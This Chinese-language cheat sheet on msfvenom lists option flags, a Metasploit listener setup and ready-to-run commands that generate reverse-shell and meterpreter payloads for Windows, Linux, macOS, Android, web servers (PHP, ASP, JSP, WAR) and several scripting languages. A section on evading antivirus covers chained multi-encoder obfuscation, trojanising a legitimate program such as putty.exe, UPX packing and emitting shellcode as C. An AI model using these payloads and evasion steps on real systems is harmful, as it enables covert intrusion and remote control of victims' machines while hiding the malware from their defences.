---
description: msf 的基础使用
---

# 🚲 msfvenom

## 1. 木马连接方式

1. 正向连接： 攻击主机主动连接目标机器
2. 反向连接： 目标机器连接攻击主机

## 2. msfvenom 常用选项

```bash
-l  列出所有可用的payload,编码器,空指令……
-p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的
-f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式
-e  指定要使用那种编码器
-i  指定编码的次数,如果使用编码器
-b  指定坏字符,比如空字符截断问题,等等……
-x  使用一个自定义可执行程序模板,并将payload嵌入其中
-k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用
-o  指定创建好的payload的存放位置
```

## 3. 如何使用 msf 创建监听器

```bash
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
run
```

## 4. 创建 Msf payload

直接使用msfvenom生成的反弹shell程序一般都会被杀毒软件无情差杀掉\
避免被查杀的最普遍方法是编码，简单来说就是改变可执行文件中的代码形状，从而让只识别静态特征码的杀毒软件无法识别，且当木马运行之后，木马会将原始程序解码到内存中，如此木马原来的功能自然也不会受到影响

可以使用`x86/shikata_ga_nai` 动态编码器进行混淆，简单单次混淆一般都能被杀毒软件先解码再查杀识别出来，那么尝试使用 **多重编码器多次混淆**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i5 -f raw | msfvenom -e x86/shikkata_ga_nai -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -b '\x00\x0a\xff' -f exe -o shell.exe
```

如果进行多次编码的马儿还是被查杀，可以尝试 **更换可执行文件模板**，重新生成木马

```bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -x putty.exe -k -i 5 -f exe -o shell.exe
```

发现更换可执行文件模板的马儿依然被查杀，编码和更换模板都行不通，可以试试 **加壳**。软件加壳基本原理就是对可执行文件进行加密压缩，执行之后将代码解压为原始程序，这里分别使用5、9级别upx加壳等级对木马进行加壳

<pre class="language-bash"><code class="lang-bash"><strong>upx -5 shell.exe -o upx5_shell.exe
</strong>upx -9 shell.exe -o upx9_shell.exe</code></pre>

将木马藏在可执行文件里面，文件的md5值会发生改变，杀毒软件将文件与官方原版文件进行对比即可判断是否异常，这里 **换一个不常见的可执行文件模板（可以是自己写的）**\
还有可以不直接生成可执行文件，而是 **生成c代码**

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 15 -b '\x00\' -f c -o shell.c
```

### 1. Windows 平台

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o x86_shell.exe
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=<ip> LPORT=<port> -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1
```

### 2. Linux 平台

```bash
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
```

### 3. MAC  平台

```bash
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o x86_shell.macho
```

### 4. 安卓平台

```bash
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f apk -o x86_shell.apk
```

### 5. WEB Payloads

```bash
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

### 6. 脚本 Payloads

```bash
# Python
msfvenom -p python/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o rshell.py

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw -o shell.pl

# Node.js
msfvenom -p nodejs/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.js

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw -o shell.sh

# ruby
msfvenom -p ruby/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o x86_shell.rb

# lua
msfvenom -p cmd/unix/reverse_lua LHOST=<ip> LPORT=<port> -f raw -o x86_shell.lua
```

### &#x20;
